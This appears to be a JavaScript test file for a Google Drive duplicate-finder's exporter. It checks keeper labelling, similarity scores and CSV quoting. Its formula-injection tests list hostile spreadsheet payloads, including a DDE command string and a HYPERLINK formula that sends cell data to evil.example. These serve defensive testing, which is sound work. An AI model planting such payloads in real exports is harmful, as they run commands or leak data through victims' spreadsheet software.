/*
 * Drive Dupe Destroyer (DDD) — test/exporter.test.js
 *
 * Copyright (c) 2026 Carlos Camacho
 * SPDX-License-Identifier: PolyForm-Noncommercial-1.0.0
 */
// The CSV/JSON export rows.
//
// This is a record people act on: the README presents export as "records before
// cleanup", and the JSON is the obvious thing to script a bulk delete against.
// A row labelled DUPLICATE that is actually the keeper costs someone an
// original, so the labelling is worth pinning down.

import { test, describe } from "node:test";
import assert from "node:assert/strict";

import { buildExportItems } from "../js/exporter.js";

/** Hash entries are Uint8Array; equal arrays mean distance 0. */
function entry(bytes) {
  return { base8: new Uint8Array(bytes.slice(0, 8)), base12: new Uint8Array(bytes) };
}

const SAME = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18];
const NEAR = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19]; // 1 byte differs
const FAR  = [255, 254, 253, 252, 251, 250, 249, 248, 247, 246, 245, 244, 243, 242, 241, 240, 239, 238];

function file(id, { w, h, size, md5, path } = {}) {
  const f = { id, name: `${id}.jpg`, size: String(size ?? 1000) };
  if (w && h) f.imageMediaMetadata = { width: w, height: h };
  if (md5) f.md5Checksum = md5;
  if (path) f._path = path;
  return f;
}

describe("buildExportItems", () => {
  // Regression: keepIdx came from `g.findIndex(f => f._isKeep)`, and nothing in
  // the codebase ever set _isKeep. findIndex returned -1, fi starts at 0, so
  // `fi === keepIdx` was never true -- every row exported as DUPLICATE,
  // including the file the app had decided to keep.
  test("exactly one row per group is marked KEEP", () => {
    const groups = [[
      file("big", { w: 4000, h: 3000 }),
      file("small", { w: 800, h: 600 }),
    ]];
    const items = buildExportItems(groups, new Map(), new Map(), { keepRule: "hires" });

    const keeps = items.filter(i => i.role === "KEEP");
    assert.equal(keeps.length, 1, "a group must nominate exactly one keeper");
    assert.equal(keeps[0].name, "big.jpg", "and it must be the one the keep rule picks");
    assert.equal(items.filter(i => i.role === "DUPLICATE").length, 1);
  });

  test("the KEEP row agrees with chooseKeepIndex for every rule", () => {
    const groups = [[
      file("older", { w: 100, h: 100, size: 10 }),
      file("bigger", { w: 100, h: 100, size: 9999 }),
    ]];
    const largest = buildExportItems(groups, new Map(), new Map(), { keepRule: "largest" });
    assert.equal(largest.find(i => i.role === "KEEP").name, "bigger.jpg");

    const smallest = buildExportItems(groups, new Map(), new Map(), { keepRule: "smallest" });
    assert.equal(smallest.find(i => i.role === "KEEP").name, "older.jpg");
  });

  test("folderPriority works, which needs _path resolved from pathMap first", () => {
    const groups = [[file("a"), file("b")]];
    const pathMap = new Map([["a", "/My Drive/Downloads"], ["b", "/My Drive/Originals"]]);
    const items = buildExportItems(groups, pathMap, new Map(), {
      keepRule: "folderPriority",
      folderPriority: "originals",
    });
    assert.equal(items.find(i => i.role === "KEEP").name, "b.jpg");
  });

  // Regression: similarityPct read f._matchDist, never assigned, so it was
  // always null -- the export carried no similarity information at all.
  describe("similarityPct", () => {
    test("the keep file itself is 100", () => {
      const groups = [[file("a", { w: 10, h: 10 }), file("b", { w: 5, h: 5 })]];
      const idToEntry = new Map([["a", entry(SAME)], ["b", entry(NEAR)]]);
      const items = buildExportItems(groups, new Map(), idToEntry, { keepRule: "hires" });
      assert.equal(items.find(i => i.role === "KEEP").similarityPct, 100);
    });

    test("a near-identical duplicate scores high, a distant one low", () => {
      const groups = [[file("keep", { w: 10, h: 10 }), file("near", { w: 5, h: 5 })]];
      const near = buildExportItems(groups, new Map(),
        new Map([["keep", entry(SAME)], ["near", entry(NEAR)]]), { keepRule: "hires" });
      const nearPct = near.find(i => i.role === "DUPLICATE").similarityPct;

      const farGroups = [[file("keep", { w: 10, h: 10 }), file("far", { w: 5, h: 5 })]];
      const far = buildExportItems(farGroups, new Map(),
        new Map([["keep", entry(SAME)], ["far", entry(FAR)]]), { keepRule: "hires" });
      const farPct = far.find(i => i.role === "DUPLICATE").similarityPct;

      assert.ok(nearPct !== null && farPct !== null, "both must produce a number, not null");
      assert.ok(nearPct > farPct, `near (${nearPct}) must score above far (${farPct})`);
    });

    // Regression: the old code hardcoded /144, the 12x12 dHash bit count. The
    // #dhashSize setting also offers 8x8 (64 bits), where that formula reports
    // roughly 2.25x the true similarity.
    test("honours bitsCount rather than assuming 144", () => {
      const groups = [[file("keep", { w: 10, h: 10 }), file("dupe", { w: 5, h: 5 })]];
      const idToEntry = new Map([["keep", entry(SAME)], ["dupe", entry(FAR)]]);

      const at144 = buildExportItems(groups, new Map(), idToEntry, { keepRule: "hires", bitsCount: 144 });
      const at64  = buildExportItems(groups, new Map(), idToEntry, { keepRule: "hires", bitsCount: 64 });

      const p144 = at144.find(i => i.role === "DUPLICATE").similarityPct;
      const p64  = at64.find(i => i.role === "DUPLICATE").similarityPct;
      assert.notEqual(p144, p64, "a different bit count must produce a different percentage");
    });

    test("byte-identical files are 100 even with no hash entry", () => {
      // The MD5 fast path deliberately skips hashing exact duplicates, so they
      // reach the export with no entry to measure.
      const groups = [[file("a", { md5: "abc123" }), file("b", { md5: "abc123" })]];
      const items = buildExportItems(groups, new Map(), new Map(), { keepRule: "largest" });
      const dupe = items.find(i => i.role === "DUPLICATE");
      assert.equal(dupe.similarityPct, 100);
      assert.equal(dupe.matchType, "exact-md5");
    });

    test("stays null when there is genuinely nothing to compare", () => {
      const groups = [[file("a"), file("b")]];
      const items = buildExportItems(groups, new Map(), new Map(), { keepRule: "largest" });
      assert.equal(items.find(i => i.role === "DUPLICATE").similarityPct, null);
    });
  });

  test("carries the folder path and numbers groups from 1", () => {
    const groups = [[file("a"), file("b")], [file("c"), file("d")]];
    const pathMap = new Map([["a", "/My Drive/Photos"]]);
    const items = buildExportItems(groups, pathMap, new Map(), {});
    assert.equal(items.find(i => i.id === "a").path, "/My Drive/Photos");
    assert.deepEqual([...new Set(items.map(i => i.group))], [1, 2]);
  });

  test("empty input produces no rows rather than throwing", () => {
    assert.deepEqual(buildExportItems([], new Map(), new Map(), {}), []);
  });
});

// ---------------------------------------------------------------------------
// itemsToCsv (#93)
// ---------------------------------------------------------------------------
//
// This is the function that actually writes the file, and it was the one part
// of the exporter with no tests at all. Everything it writes is a Drive
// filename or folder path — text someone else may have chosen, since files and
// folders shared into your Drive carry the sharer's names.

import { itemsToCsv, csvCell, CSV_BOM } from "../js/exporter.js";

/** Split a CSV into records the way a conforming reader would. */
const records = (csv) => csv.split("\r\n");

describe("csvCell", () => {
  // CWE-1236. Excel, Sheets and LibreOffice all evaluate a cell that BEGINS
  // with one of these. Quoting does not prevent it — a quoted "=HYPERLINK(…)"
  // is still a live formula — so the guard has to change the value itself.
  describe("formula injection", () => {
    for (const evil of [
      `=cmd|'/c calc'!A1`,
      `=HYPERLINK("https://evil.example/"&A1,"Open me")`,
      `+1+1`,
      `-1+1`,
      `@SUM(1+1)`,
      `\tleading tab`,
      `\rleading cr`,
    ]) {
      test(`neutralises ${JSON.stringify(evil.slice(0, 24))}`, () => {
        const out = csvCell(evil);
        const inner = out.startsWith('"') ? out.slice(1, -1).replace(/""/g, '"') : out;
        assert.equal(inner[0], "'", "the cell must no longer begin a formula");
        assert.ok(inner.includes(evil.slice(1)), "and the original text must survive");
      });
    }

    test("an ordinary filename is untouched", () => {
      assert.equal(csvCell("holiday.jpg"), "holiday.jpg");
      assert.equal(csvCell("IMG_1234 (1).HEIC"), "IMG_1234 (1).HEIC");
    });

    // The guard and "looks like a number" share exactly one leading character,
    // "-", so a negative number is the case that would get mangled into text.
    test("a plain number is left as a number", () => {
      assert.equal(csvCell(-42), "-42");
      assert.equal(csvCell("-42"), "-42");
      assert.equal(csvCell("-3.5"), "-3.5");
      assert.equal(csvCell(0), "0");
      assert.equal(csvCell(1024), "1024");
    });
  });

  describe("quoting", () => {
    test("commas, quotes and newlines are quoted", () => {
      assert.equal(csvCell("a,b"), '"a,b"');
      assert.equal(csvCell('say "hi"'), '"say ""hi"""');
      assert.equal(csvCell("two\nlines"), '"two\nlines"');
    });

    // The regression: \r was missing, so a name containing a bare carriage
    // return was written unquoted and split the record.
    test("a carriage return is quoted", () => {
      assert.equal(csvCell("before\rafter"), '"before\rafter"');
    });

    test("null and undefined become empty, not the strings", () => {
      assert.equal(csvCell(null), "");
      assert.equal(csvCell(undefined), "");
    });
  });
});

describe("itemsToCsv", () => {
  const row = (over = {}) => ({
    group: 1, role: "keep", name: "a.jpg", path: "/My Drive",
    size: 100, modifiedTime: "", md5Checksum: "", mimeType: "image/jpeg",
    width: 10, height: 10, similarityPct: 100, matchType: "exact",
    id: "id1", webViewLink: "", ...over,
  });

  test("a header plus one record per item", () => {
    const out = records(itemsToCsv([row(), row({ id: "id2" })]));
    assert.equal(out.length, 3);
    assert.ok(out[0].startsWith("group,role,name,path,"));
  });

  // The one that corrupted everything after it: one row became two records
  // with the wrong column counts, so every later value landed under the wrong
  // header.
  test("a carriage return in a name does not split the record", () => {
    const out = records(itemsToCsv([row({ name: "before\rafter.jpg" })]));
    assert.equal(out.length, 2, "header plus exactly one data record");
    assert.equal(out[0].split(",").length, out[1].split(",").length,
      "and the data record has the same column count as the header");
  });

  test("records are separated by CRLF", () => {
    const csv = itemsToCsv([row()]);
    assert.ok(csv.includes("\r\n"), "RFC 4180 separator");
    assert.equal(csv.split("\r\n").length, 2);
  });

  test("no items still produces the header", () => {
    assert.equal(records(itemsToCsv([])).length, 1);
  });

  // Excel reads the encoding from a byte-order mark, not the MIME type, so
  // without this every accented, CJK or emoji filename opened as mojibake.
  test("the BOM is a real UTF-8 BOM and is not part of the CSV text itself", () => {
    assert.equal(CSV_BOM, "﻿");
    assert.ok(!itemsToCsv([row()]).startsWith(CSV_BOM), "it is prepended at download, not baked in");
  });
});
